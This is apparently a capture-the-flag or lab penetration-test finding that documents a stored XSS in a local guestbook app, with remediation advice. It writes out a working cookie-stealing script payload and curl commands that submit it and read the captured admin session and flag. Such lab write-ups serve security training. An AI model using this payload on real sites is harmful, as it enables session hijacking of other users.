# Finding 3 — Stored XSS (cross-site scripting)

- **Class:** Stored/Persistent XSS (CWE-79) — OWASP A03:2021 — Injection
- **Endpoint:** `POST /guestbook` (stored), rendered on `GET /guestbook`
- **Severity:** High — executes attacker JS in every visitor's session,
  including the admin; used here to steal the admin session cookie.
- **Flag:** `FLAG{xss_d7ddad05744e}`

## Request (reproducible)
```bash
curl -s -b cookies.txt \
  --data-urlencode "comment=<script>fetch('/grab?c='+document.cookie)</script>" \
  http://127.0.0.1:5000/guestbook
# then read the exfiltration sink:
curl -s http://127.0.0.1:5000/grab
```
Stored payload: `<script>fetch('/grab?c='+document.cookie)</script>`

## Result (actual)
- Comment is stored and rendered **unescaped**:
  `<span class="text"><script>fetch('/grab?c='+document.cookie)</script></span>`
- The simulated admin bot visits the guestbook, runs the script with the admin
  cookie, and hits `/grab`. The sink shows:
  `c=session=admin; flag=FLAG{xss_d7ddad05744e}`

## Why it works
The guestbook template prints the comment body without HTML-escaping
(app.py:288 notes the template uses the raw value), so markup in a stored
comment becomes live DOM. The script reads `document.cookie` and sends it to an
attacker-controlled endpoint. A real admin browsing the page would leak their
session the same way the simulated bot does.

## Remediation
- **Contextual output encoding / auto-escaping**: render user content with
  Jinja's default autoescaping (do not use `| safe` / `Markup` on user input).
- Add a **Content-Security-Policy** (e.g. `default-src 'self'; script-src 'self'`)
  to block inline/injected scripts as defense-in-depth.
- Set session cookies `HttpOnly` (and `Secure`, `SameSite`) so JS cannot read
  them even if XSS occurs.
- Validate/sanitize input server-side (allowlist), and encode on output.

---

## Additional captured evidence (reproduction 2026-10-11)

Three-stage capture with a fresh marker payload
`<script>fetch('/grab?run2='+document.cookie)</script>`:

1. `poc/03_xss_submit_response.txt` — `POST /guestbook` submission -> `302` to
   `/guestbook`.
2. `poc/03_xss_stored_unescaped.txt` — `GET /guestbook` showing the payload
   stored **unescaped** as a raw `<script>` tag inside the comment `<span>`.
3. `poc/03_xss_grab_response.txt` — after **waiting ~4s** for the simulated admin
   bot (it polls new comments every ~2s), the `/grab` sink shows
   `run2=session=admin; flag=FLAG{xss_d7ddad05744e}`.

**Cookie prerequisite.** The guestbook submission requires **no authentication**
(the app attributes anonymous posts to `anonymous`); a session cookie is optional
and was used only to attribute the comment to `alice`. The **admin** cookie that
carries the flag is injected by the simulated bot (`app.py` sets
`admin_cookie = "session=admin; flag=..."`), not supplied by the attacker.
